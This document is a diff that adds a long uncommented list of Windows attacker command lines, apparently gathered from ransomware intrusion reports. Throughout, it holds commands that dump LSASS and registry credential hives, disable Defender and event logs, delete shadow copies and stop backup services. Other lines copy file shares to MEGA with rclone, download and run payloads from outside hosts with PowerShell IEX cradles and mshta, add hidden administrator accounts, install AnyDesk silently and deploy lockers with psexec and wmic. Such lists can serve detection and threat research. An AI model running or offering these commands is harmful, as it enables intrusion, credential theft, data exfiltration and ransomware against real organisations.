@@ -1,0 +1,1518 @@
+C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft && mkdir Network
+C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && powershell Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath %appdata%\Microsoft\Network
+C:\Windows\system32\cmd.exe /c attrib +S +H %appdata%\Microsoft\Network
+C:\Windows\system32\cmd.exe /c attrib +S +H %appdata%\Microsoft\Network\python-3.10.4-embed-amd64.zip
+C:\Windows\system32\cmd.exe /c attrib +S +H %appdata%\Microsoft\Network\Packages.txt
+C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && python.exe Packages.txt
+C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && powershell -Command start script.bat -Verb RunAs
+c:\windows\system32\schtasks.exe /run /tn microsoft\windows\wininet\cachetask
+c:\windows\system32\reg.exe add hklm\software\microsoft\windows nt\currentversion\image file execution options\taskmgr.exe /v debugger /t reg_sz /d c:\system
+c:\windows\system32\wevtutil.exe set-log microsoft-windows-taskscheduler/operational /enabled:false
+c:\windows\system\procdump.exe -accepteula -ma lsass.exe lsass.dmp
+c:\windows\system\dumpert.exe lsass.exe
+powershell rundll32.exe c:\windows\system32\comsvcs.dll, minidump (get-process lsass).id c:\temp\lsass.dmp full
+c:\windows\system32\windowspowershell\v1.0\powershell.exe -exec bypass .\adrecon.ps1
+c:\windows\system32\wevtutil.exe set-log active directory web services /enabled:false
+c:\windows\system32\wevtutil.exe set-log hardwareevents /enabled:false
+c:\windows\system32\wevtutil.exe set-log internet explorer /enabled:false
+cmd.exe /q /c reg add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> \\127.0.0.1\admin\$\__<timestamp>\.<num> 2>&1
+cmd.exe /q /c #upload c:\users\<user>\documents\<doc> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
+cmd.exe /q /c #download c:\users\<user>\documents\<doc> /home/kali/desktop/<doc> 1> \\127.0.0.1\admin$\<num>.<num> 2>&1
+c:\windows\system32\windowspowershell\v1.0\powershell.exe -exec bypass .\apply.ps1
+cmd.exe /c \\<domaincontroller>\netlogon\def.vbs
+cmd.exe -c \\<domain controller>\netlogon\<num>.exe --access-token <token>
+cmd.exe -c \\<domain controller>\netlogon\<num>.exe
+<num>.exe -access-token <token> -v -p \\<hostname>\scans
+c:\windows\system32\cmd.exe /c fsutil behavior set symlinkevaluation r2l:1
+C:\Windows\system32\cmd.exe /C net time
+C:\Windows\system32\cmd.exe /C ping [Domain Controller]
+C:\Windows\system32\cmd.exe /C nltest /dclist:[Domain Name]
+C:\Windows\system32\cmd.exe /C Net group "Domain Admins" /domain \
+C:\Windows\system32\cmd.exe /C nslookup
+C:\Windows\system32\cmd.exe /C ping 190.114.254.116
+C:\Windows\system32\cmd.exe /C net group /domain
+cmd.exe /c C:ProgramDataAnyDesk.exe –install C:ProgramDataAnyDesk –start-with-win –silent
+C:\Windows\system32\cmd.exe /C cool.exe [DC IP ADDRESS] [DOMAIN NAME] Administrator -c "taskkill /f /im explorer.exe"
+"schtasks.exe" /Create /RU "NT AUTHORITY\SYSTEM" /tn juqpxmakfk /tr "regsvr32.exe -s \"C:\Users\REDACTED\ocrafh.html\"" /SC ONCE /Z /ST 14:20 /ET 14:32
+ls.exe all -oN -output C:\Users\REDACTED
+procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp
+C:\Windows\System32\cmd.exe /c rundll32.exe C:\ProgramData\x86.dll, StartA
+C:\Windows\system32\cmd.exe /C copy \\<REMOTE_WORKSTATION>\C$\ProgramData\lsass.dmp c:\programdata\lsass.dmp
+C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.zip c:\programdata\lsass.dmp
+C:\Windows\system32\cmd.exe /C 7za.exe a -tzip -mx5 c:\programdata\lsass.dmp c:\programdata\lsass.zip
+rclone.exe copy \\REDACTED\Shares mega:Shares -q --ignore-existing --auto-confirm --multi-thread-streams 4 --transfers 4
+rclone.exe copy "\\SERVER.domain.name\path" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+rclone.exe "\\SERVER.domain.name\path" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+psexec.exe \\<IP ADDRESS> -u <DOMAIN>\Administrator -p "<PASSWORD>" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\ttsel.exe
+wmic /node:"<IP ADDRESS>" /user:"<DOMAIN>\Administrator" /password:"<PASSWORD>" process call create "cmd.exe /c c:\windows\temp\ttsel.exe"
+rundll32.exe locker.dll ,run /TARGET=\\HOST1.DOMAIN.NAME\C$
+ping  -n 1 <REDACTED>shell wmic /node:<REDACTED> process get executablepath
+C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers_live.txt) do net view \\%i /all >> C:\ProgramData\servers_live_netview.txt
+C:\Windows\system32\cmd.exe /C for /f %%i in (C:\ProgramData\servers_live.txt) do dir \\%%i\C$ >> C:\ProgramData\servers_live_dir.txt
+C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\hosts.txt) do ping -n 1 %i -v 4 | find /I "TTL" >> C:\ProgramData\hosts_live.txt
+C:\Windows\system32\cmd.exe /C for /f %i in (C:\ProgramData\servers.txt) do ping -n 1 %i -v 4 | find /I "TTL" >> C:\ProgramData\servers_live.txt
+cmd /C > C:\ProgramData\1.txt 2>&1 reg query HKEY_USERS\\<SID>\Network
+C:\Windows\system32\cmd.exe /C wmic /node:<REDACTED> process call create "cmd /C > C:\ProgramData\1.txt 2>&1 reg query HKEY_USERS\<SID>\Network"
+cmd.exe /C powershell Get-MpComputerStatus > C:\Windows\Temp\KMzFGwGn.tmp 2>&1
+C:\Windows\system32\cmd.exe /C AdFind.exe -f "&(objectcategory=computer)" operatingSystem -csv > 1.csv
+C:\Windows\system32\cmd.exe /C AdFind.exe -f "objectcategory=person" sAMAccountName name displayName givenName department description title mail logonCount -csv > person.csv
+tasklist /S <IP of remote host>
+cmd.exe /C wmic /node:<remote host> process get executablepath
+adfind.exe -f "(objectcategory=person)" > ad_users.txt
+adfind.exe -f "(objectcategory=computer)" > ad_computers.txt
+adfind.exe -sc trustdmp > trustdmp.txt
+adfind.exe -subnets -f "(objectCategory=subnet)" > subnets.txt
+adfind.exe -gcb -sc trustdmp > trustdmp.txt
+adfind.exe -sc domainlist > domainlist.txt
+adfind.exe -sc dcmodes > dcmodes.txt
+adfind.exe -sc adinfo > adinfo.txt
+adfind.exe -sc dclist > dclist.txt
+adfind.exe -sc computers_pwdnotreqd > computers_pwdnotreqd.txt
+attrib +h svshost.exe
+attrib +h XMRig CPU mine.exe
+attrib +h config.json
+attrib +h HideAll.bat
+attrib +h xmrig-notls.exe
+zero.exe [TARGET_DC_NETBIOS_NAME] [TARGET_DC_MACHINE_ACCOUNT$] administrator -c "whoami"
+reg query "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v PortNumber
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0
+netsh advfirewall firewall set rule group="remote desktop" new enable=yes
+netsh advfirewall firewall add rule name="allow RDP" dir=in protocol=TCP localport=3389 action=allow
+C:\Windows\system32\cmd.exe secretsdump.exe -hashes :[HASH REDACTED] [USERNAME REDACTED]@[IP ADDRESS REDACTED]
+C:\Windows\system32\cmd.exe wmiexec.exe :NTLM_HASH domain_admind@dc_ip
+%WINDIR%\system32\NOTEPAD.EXE C:\Decryption_INFO.txt
+C:\Windows\system32\cmd.exe /C C:\Windows\Temp\adf\anchorAsjuster_x64.exe --source=anchorDNS_x64.exe --target=anchor_x64.exe --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid
+reg query hklm\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+reg query hklm\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+reg query hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName" /s
+reg query hkcu\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall /v "DisplayName"
+net group "enterprise admins" /domain
+net group "domain admins" /domainsysteminfo
+C:\Windows\system32\cmd.exe /C ping HOSTX
+C:\Windows\system32\cmd.exe /c ""C:\info\start.bat""
+cmd.exe /c echo a3fed5b3a32 > \\.\pipe\3406c2
+cmd.exe /c nltest /domain_trusts /all_trusts
+C:\Windows\system32\cmd.exe /C net group "enterprise admins" /domain
+C:\Windows\system32\cmd.exe /C net group "domain admins" /domain
+C:\Windows\system32\cmd.exe /C systeminfo
+C:\Windows\system32\cmd.exe /C ping HOST
+C:\Windows\system32\cmd.exe /C nltest /domain_trusts /all_trusts
+C:\Windows\system32\cmd.exe /C time
+C:\Windows\system32\cmd.exe /C C:\Windows\Temp\adf\adf.bat
+adfind.exe -f "objectcategory=computer"
+adfind.exe -sc trustdmp
+adfind.exe -subnets -f (objectCategory=subnet)
+adfind.exe -f "(objectcategory=group)"
+adfind.exe -gcb -sc trustdmp
+C:\Windows\system32\cmd.exe /c ""C:\Users\USER\Desktop\info\start.bat""
+nltest /dclist:<hidden>.local
+net localgroup Administrators
+adfind.exe -f "(objectcategory=organizationalUnit)"
+start PsExec.exe -accepteula @C:\share$\comps1.txt -u "domain\User" -p "$PASSWORD" cmd /c COPY "\\DOMAINCONTROLLER\share$\fQumH.exe" "C:\windows\temp\"
+start PsExec.exe -accepteula -d @C:\share$\comps5.txt -u "domain\User" -p "$PASSWORD" cmd /c "C:\windows\temp\fQumH.exe"
+net user sqlbackup qc69t4b#z0ke3 /add
+net user localadmin qc69t4b#z0ke3 /add
+net localgroup administrators localadmin /add
+ntdsAudit.exe ntds.dit -s SYSTEM -p pwddump.txt -u users.csv
+net localgroup "administrator" (comment: command mistyped)
+net group "domain admins" /dom
+ping -n 1 hostname >> C:\programdata\log.txt
+ping -n 1 hostname2 >> C:\programdata\log.txt
+ping -n 1 hostname3 >> C:\programdata\log.txt
+C:\Windows\system32\net1 group "domain admins" /dom
+C:\Windows\system32\cmd.exe /C ping DOMAINCONTROLLER
+C:\Windows\system32\cmd.exe /C ping ENDPOINT
+C:\Windows\system32\cmd.exe /C net localgroup Administrators
+C:\Windows\system32\cmd.exe /c "C:\\Users\\info\\start.bat"
+powershell.exe -executionpolicy remotesigned -File .\Get-DataInfo.ps1 method
+C:\Windows\system32\cmd.exe /C wmic /node:"DOMAINCONTROLLER" process call create "C:\3.exe"
+C:\Windows\system32\cmd.exe /C wmic /node:"ENDPOINT" process call create "C:\test.exe"
+C:\Windows\system32\cmd.exe /C nltest /dclist <domainname redacted>
+C:\Windows\system32\cmd.exe /C ping <hostname redacted>
+C:\Windows\system32\cmd.exe /C All windows Import-Module ActiveDirectory Get-ADComputer -Filter {enabled -eq $true} -properties *|select Name, DNSHostName, OperatingSystem, LastLogonDate, IPv4Address | Export-CSV C:\Users\AllWindows.csv -NoTypeInformation -Encoding UTF8
+C:\Windows\system32\cmd.exe /C route print
+C:\Windows\system32\cmd.exe /C ping http://<IP redacted>/
+C:\Windows\system32\cmd.exe /C ping http://<IP redacted>
+C:\Windows\system32\mmc.exe C:\Windows\system32\dsa.msc
+C:\Windows\system32\mmc.exe C:\Windows\System32\gpedit.msc
+C:\Windows\System32\cmd.exe /c start rundll32 namr.dll,IternalJob
+C:\Windows\system32\cmd.exe /C powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://104.243.33.50:80/a'))"
+C:\Windows\system32\cmd.exe /C powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring(' http://104.243.33.50:80/a '))"
+C:\Windows\system32\cmd.exe /C getsystem
+cmd.exe /C rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 968 C:\ProgramData\REDACTED\lsass.dmp full
+C:\programdata\procdump64.exe -accepteula -ma lsass.exe C:\ProgramData\lsass.dmp
+tasklist /v /s <REMOTE_IP>
+net group "Domain computers" /dom
+ping -n 1 <REMOTE_IP>
+C:\Windows\system32\cmd.exe /C shell whoami /all
+Seatbelt.exe -group=all -outputfile= "C:\ProgramData\seatinfo.txt"
+%windir%\system32\cmd.exe /c start rundll32.exe mkl2n.dll,kXlNkCKgFC
+cmd.exe /c echo wafrms > \\.\pipe\wafrms
+C:\Windows\system32\cmd.exe /c echo dec8f35bcbf > \\.\pipe\7fd13a
+C:\Windows\system32\cmd.exe /C reg.exe save hklm\sam c:\ProgramData\sam.hive
+C:\Windows\system32\cmd.exe /C reg.exe save hklm\security c:\ProgramData\security.save
+C:\Windows\system32\cmd.exe /C reg.exe save hklm\system c:\ProgramData\system.save
+af.exe -f "(objectcategory=person)" > ad_users.txt
+af.exe -f "objectcategory=computer" > ad_computers.txt
+cmd.exe /c rundll32.exe C:\ProgramData\n23.dll,AddProgram
+C:\Windows\System32\rundll32.exe tamirlan.dll,EdHVntqdWt
+net user sql_admin P@ssw0rd! /add
+net localgroup Administrators sql_admin /ADD
+C:\Windows\system32\cmd.exe /C ping -n 1 <REDACTED_DOMAIN_NAME>
+C:\Windows\system32\cmd.exe /C tasklist /v /s <REDACTED_IP>
+C:\Windows\system32\cmd.exe /C af.exe -f "(objectcategory=person)" > ad_users.txt
+C:\Windows\system32\cmd.exe /C af.exe -f "objectcategory=computer" > ad_computers.txt
+C:\Windows\system32\cmd.exe /C af.exe -f "(objectcategory=organizationalUnit)" > ad_ous.txt
+C:\Windows\system32\cmd.exe /C af.exe -sc trustdmp > trustdmp.txt
+C:\Windows\system32\cmd.exe /C af.exe -subnets -f (objectCategory=subnet) > subnets.txt
+C:\Windows\system32\cmd.exe /C af.exe -f "(objectcategory=group)" > ad_group.txt
+C:\Windows\system32\cmd.exe /C af.exe -gcb -sc trustdmp > trustdmp.txt
+net localgroup Administrators Support /add & net localgroup "Remote Desktop Users" Support /add
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /t REG_DWORD /f /d 0 /v Support
+taskkill /F /IM MSASCuiL.exe
+REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v "HideSCAHealth" /t REG_DWORD /d 0x1 /f
+REG ADD "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v "DisableNotificationCenter" /t REG_DWORD /d 0x1 /f
+REG DELETE "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v "SecurityHealth" /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "AllowFastServiceStartup" /t REG_DWORD /d 0x0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d 0x0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "DisableBlockAtFirstSeen" /t REG_DWORD /d 0x1 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "LocalSettingOverrideSpynetReporting" /t REG_DWORD /d 0x0 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d 0x2 /f
+REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v "NotificationSuppress" /t REG_DWORD /d 0x1 /f
+"C:\Windows\system32\net.exe" group /domain
+"C:\Windows\system32\net.exe" group "domain admins" /domain
+netsh advfirewall firewall add rule name="rdp" dir=in protocol=tcp localport=3389 action=allow
+netsh advfirewall firewall set rule group="windows management instrumentation (wmi)" new enable=yes
+reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+cmd /c "C:\Users\Administrator\Music\start — копия.bat"
+rclone.exe copy "\\[FILE SERVER]\human resources" MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+rclone.exe copy "\\[FILE SERVER]\Files" MEGA:domain -q --ignore-existing --auto-confirm --multi-thread-streams 12 --transfers 12
+schtasks /create /ru SYSTEM /sc ONSTART /tn Update2 /tr "cmd /c rundll32 %PUBLIC%\music\svcmc.dll, MainFunc" schtasks /run /TN Update2
+"%PUBLIC%\Music\rclone.exe" copy E:\REDACTED\customers ftp1:REDACTED/customers -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console
+%WINDIR%\system32\cmd.exe /C .\rclone.exe copy "E:\REDACTED\domain" mega:REDACTED/domain -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console
+%WINDIR%\system32\cmd.exe /c ""%PUBLIC%\Music\WMI.bat"
+%PUBLIC%\Music\SETUP.bat %PUBLIC%\Music\COPY.bat
+%PUBLIC%\Music\ds.exe" %PUBLIC%\Music\DEF.bat
+cmd.exe /c bitsadmin /transfer update_service \\REDACTED\share$\ds.exe %APPDATA%\ds.exe & %APPDATA%\ds.exe -pass REDACTED
+PsExec.exe /accepteula @comps1.txt -u "domain.local\Administrator" -p "REDACTED" cmd /c COPY "\\REDACTED\share$\ds.exe" "%WINDIR%\temp"
+PsExec.exe /accepteula @comps1.txt -u "domain.local\Administrator" -p "REDACTED" cmd /c COPY "\\REDACTED\share$\ds.exe" %WINDIR%\temp
+%WINDIR%\system32\cmd.exe /c ""%PUBLIC%\Music\share$\COPY.bat"
+PsExec.exe /accepteula -d \\REDACTED -u "domain.local\Administrator" -p "REDACTED" cmd /c COPY /Y "\\REDACTED\share$\ds.exe" "%PUBLIC%\Music"
+PsExec.exe /accepteula -d \\REDACTED -u "domain.local\Administrator" -p "REDACTED" cmd /c COPY /Y "\\REDACTED\share$\ds.exe" %PUBLIC%\Music
+cmd /c COPY /Y "\\REDACTED\share$\ds.exe" "%PUBLIC%\Music"
+cmd /c COPY /Y "\\REDACTED\share$\ds.exe" %PUBLIC%\Music
+%WINDIR%\system32\cmd.exe /c "C:\share$\WMI1.bat"
+cmd.exe /c "bitsadmin /transfer ds "\\REDACTED\share$\ds.exe" "%APPDATA%\ds.exe" && "%APPDATA%\ds.exe" -pass REDACTED"
+C:\Windows\system32\cmd.exe /c echo 0291f1e69dd > \\.\pipe\82afc1
+makecab "C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.bin" C:\Users\<REDACTED>\AppData\Local\Temp\logFileuyovaqv.cab
+mshta http://92.51.2[.]22:443/UsySLX1n.hta
+rundll32.exe "C:\Users\REDACTED\AppData\Local\Temp\rate_x32.dat" ,update /i:"LaborBetray\license.dat"
+cmd.exe /C dir %HOMEDRIVE%%HOMEPATH%
+cmd.exe /C reg add "hklm\system\currentControlSet\Control\Terminal Server" /v "fDenyTSConnections" /t REG_DWORD /d 0x0 /f
+cmd.exe /C copy 192145.dll \\<INTERNAL_IP>\ADMIN$ /Y /Z
+psexec.exe -accepteula -d -s \\<INTERNAL_IP> rundll32.exe C:\windows\192145.dll,StartW
+psexec.exe -accepteula -d -s \\<INTERNAL_IP> rundll32.exe C:\windows\192145.dll ,StartW
+rclone.exe  copy --max-age 2y "\\SERVER\Shares" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M
+C:\o4IRWsH4N1a3hjO9Sy2rPP02oyUddH7zA5xGih0ESmlhiiXD9kpWVCPfOwUnayZp_locker.exe -m -net -size 10 -nomutex -p \\TARGETHOST\C$
+"C:\Windows\System32\schtasks.exe" /Create /SC MINUTE /TN "Update service for Windows Service" /TR "PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File C:\Users\Administrator\update.ps1" /MO 30 /F
+"C:\Windows\System32\schtasks.exe" /Create /SC MINUTE /TN "Update service for Windows Service" /TR PowerShell.exe -ExecutionPolicy bypass -windowstyle hidden -File C:\Users\Administrator\update.ps1
+find.exe  -f "(objectcategory=person)" > ad_users.txt
+find.exe  -f "objectcategory=computer" > ad_computers.txt
+find.exe -f "(objectcategory=organizationalUnit)" >  ad_ous.txt
+find.exe -subnets -f (objectCategory=subnet)> subnets.txt
+find.exe  -f "(objectcategory=group)" > ad_group.txt
+cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
+cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --set-password
+cmd.exe /c C:\ProgramData\AnyDesk.exe --get-id
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\sam c:\ProgramData\sam.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /v "DelegateExecute" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\security c:\ProgramData\security.save" /f
+reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d "reg.exe save hklm\system c:\ProgramData\system.save" /f
+reg.exe delete hkcu\software\classes\ms-settings /f >nul 2>&1
+"C:\Program Files\Microsoft SQL Server\Client SDK\ODBC\130\Tools\Binn\sqlcmd.exe"  -S localhost,51341 -E -y0 -Q "SELECT TOP (1000) [id],[user_name],[password],[usn],[description],[visible],[change_time_utc]FROM [VeeamBackup].[dbo].[Credentials];"
+"C:\Windows\system32\NOTEPAD.EXE" C:\Windows\Microsoft.NET\Framework\<version#>\veeam1.cs.txt
+c:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe veeam1.cs.txt
+qq.exe  -f "(objectcategory=person)"
+qq.exe  -f "objectcategory=computer"
+qq.exe -f "(objectcategory=organizationalUnit)"
+qq.exe -sc trustdmp
+qq.exe -f (objectCategory=subnet)
+qq.exe  -f "(objectcategory=group)"
+sqlcmd  -E -S localhost -Q "BACKUP DATABASE master TO DISK='c:\programdata\sql\master.bak'"
+sc config "Netbackup Legacy Network service" start= disabled
+vssadmin.exe Delete Shadows /all /quiet
+wmic.exe Shadowcopy Delete
+net stop "Zoolz 2 Service" /y
+net stop "Veeam Backup Catalog Data Service" /y
+net stop "Symantec System Recovery" /y
+net stop ""Symantec System Recovery" /y
+net stop "SQLsafe Backup Service" /y
+net stop "SQL Backups" /y
+net stop "Acronis VSS Provider" /y
+net stop VeeamDeploySvc /y
+net stop BackupExecVSSProvider /y
+net stop BackupExecRPCService /y
+net stop BackupExecManagementService /y
+net stop BackupExecJobEngine /y
+net stop BackupExecDeviceMediaService /y
+C:\Windows\System32\rundll32.exe C:/Windows/Temp//rvhz1.dll DllRegisterServer
+C:\Windows\system32\cmd.exe /c C:\Users\USER~1\AppData\Local\Temp\J10B9.cmd > C:\Users\USER~1\AppData\Local\Temp\yp710BA.tmp 2> C:\Users\USER~1\AppData\Local\Temp\1N10CB.tmp
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "(New-Object Net.WebClient).DownloadFile('http://msa.org.in/app/webroot/js/kcfinder/js/AdFind.bin', 'c:\Users\Public\adfind.exe'
+adfind -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > some.csv
+adfind -gcb -sc trustdmp >  trustdmp.txt
+pse.exe -accepteula @a.txt -c -f -d -s ufo.exe > log.txt
+"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth 5bc5f5263224697ff9a653f8efa7e7d7a2ce341920a03c60e4823331b2508c
+mstsc.exe /v:IP_ADDRESS_1
+mstsc.exe /v:IP_ADDRESS_2
+C:\Windows\SysWOW64\explorer.exe \\IP_ADDRESS_1\C$
+C:\Windows\SysWOW64\explorer.exe \\IP_ADDRESS_2\C$
+C:\Windows\System32\cmd.exe /c rundll32.exe
+wmic /node:IP_Address process call create "cmd.exe /c start C:\Progradata\sc_https_x64.exe"
+"C:\Program Files\TacticalAgent\tacticalrmm.exe" -m install --api https://api.floppasoftware[.]com --client-id 1 --site-id 1 --agent-type server --auth REDACTED
+rclone.exe  copy "\\SERVER.domain.name\path" mega:1 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+rclone.exe  copy "\\SERVER.domain.name\path" mega:2 -q --ignore-existing --auto-confirm --multi-thread-streams 6 --transfers 6
+rundll32.exe locker.dll,run /TARGET=\\HOST1.DOMAIN.NAME\C$ /TARGET=\\HOST2.DOMAIN.NAME\C$ /TARGET=\\HOST3.DOMAIN.NAME\C$ /login=DOMAIN\Administrator /password=[REDACTED] /nolog /shareall
+attrib  +s +h /D "C:\Program Files\Windows NT\*.*"
+nltest /dclist:<DOMAINNAME>.local
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List
+"C:\Program Files\WinRAR\WinRAR.exe" a -ep1  -scul -r0 -iext   -imon1 -- . G:\REDACTED
+%WINDIR%\system32\cmd.exe /C wmic /node:"REDACTED" process call create "%WINDIR%\Temp\svhost.exe "143.244.146[.]183""
+C:\Windows\System32\cmd.exe" /c echo curl https://moashraya[.]com/out/t.php --output "%temp%\magni.waut.a" --ssl no-revoke --insecure --location > "%temp%\magni.w.bat
+cmd.exe /c "%temp%\magnu.w.bat"
+cmd.exe /c ren "%temp%\magni.waut.a" "magni.w"
+rundll32 "%temp%\magni.w", scab \k arabika752
+C:\Windows\system32\cmd.exe /c echo 00e4f7418cd > \\.\pipe\9090e9
+vol -f [REDACTED].dmp  windows.memmap.Memmap --dump --pid 4860
+invokemodule -module locker -locker <REDACTED>.dll  -lockerpath programdata\microsoft -lockertype dll -lockername sysfunc -lockerdeployonly $true -lockerentrypoint run -handlesystems custom
+powershell invoke-webrequest -uri http://mrassociattes.com/images/62.gif -outfile c:\programdata\COIm.jpg
+C:\ProgramData\AnyDesk.exe --install C:\ProgramData\Any --start-with-win --silent
+adfind.exe  -gcb -sc trustdmp
+adfind.exe  -f "(objectcategory=group)"
+adfind.exe  -subnets -f (objectCategory=subnet)
+adfind.exe  -f (objectcategory=organizationalUnit)
+adfind.exe  -f objectcategory=computer
+adfind.exe  -f (objectcategory=person)
+C:\Windows\system32\cmd.exe /c dir /s /b C:\Windows\system32\*htable.xsl
+C:\Windows\system32\cmd.exe /C net group "domain Admins" /domainroute printwhoami
+cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\Any --start-with-win --silent
+cmd.exe /c echo btc1000qwe123 | C:\ProgramData\Any\AnyDesk.exe --set-password
+reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v InnLine /t REG_DWORD /d 0 /f
+cmd.exe /C C:\Recovery\AdFind.exe -f objectcategory=computer -csv name cn OperatingSystem dNSHostName > C:\Recovery\DOMAIN.csv
+rundll32.exe c:\programdata\95.dll,TstSec 11985756
+powershell.exe -Command PowerShell -Command "\"Get-CimInstance Win32_ShadowCopy | Remove-CimInstance\""
+cmd.exe /c ""vssadmin.exe Delete Shadows /all /quiet""
+cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2L:1""
+cmd.exe /c ""fsutil behavior set SymlinkEvaluation R2R:1""
+cmd.exe /c wevtutil cl security
+cmd.exe /c wevtutil cl system
+cmd.exe /c wevtutil cl application4
+lsadump::dcsync /domain:CHILD.DOMAIN.EXAMPLE /user:DOMAINADMINUSER /csv > CHILD.csv
+rclone copy [REDACTED]:/mnt/sdd/REDACTED --include-from include.txt
+WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntiVirusProduct Get * /Format:Listc
+cmd.exe /C dir *.txt
+cmd.exe /C dir *.dll
+adfind.exe -f (objectcategory=person) >  ad_users.txt
+adfind.exe -f objectcategory=computer > ad_computers.txt
+adfind.exe -f (objectcategory=organizationalUnit) > ad_ous.txt
+adfind.exe -subnets -f (objectCategory=subnet) > ad_subnets.txt
+adfind.exe -gcb -sc trustdmp >  ad_trustdmp.txt
+del 7.exe adfind* ad_*
+psexec.exe \\[TARGET IP] -u [DOMAIN]\[USER] -p "[PASSWORD]" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat
+wmic /node:"[TARGET IP]" /user:"[DOMAIN]\[USER]" /password:"[PASSWORD]" process call create "cmd.exe /c c:\windows\temp\p.bat"
+cmd.exe /C wmic /node:"servername.domainname" process call create "C:\PerfLogs\procdump.exe -accepteula -ma lsass C:\PerfLogs\lsass.dmp"
+cmd.exe /C nltest /dclist:DOMAIN.local
+cmd.exe /C ping WORKSTATION
+cmd.exe /C net view \\WORKSTATION /all
+cmd.exe /C net view \\DOMAINCONTROLLER /all
+powershell Invoke-WebRequest "http://temp.sh/VSlAV/http64.exe" -OutFile C:\programdata\rr.exe
+cmd.exe /c chcp >&2
+C:\Windows\system32\cmd.exe /c c:\windows\temp\1.bat
+adfind.exe -f (objectcategory=group)
+C:\Windows\system32\cmd.exe /C wmic /node:"REDACTED" /user:"USER" /password:"REDACTED" os get caption
+C:\\Windows\\System32\\wbem\\wmic.exe  /node:REDACTED process call create \""cmd.exe /c powershell.exe -nop -w hidden -c \""\""IEX ((new-object net.webclient).downloadstring('https://aicsoftware[.]com:757/coin'))\""\""
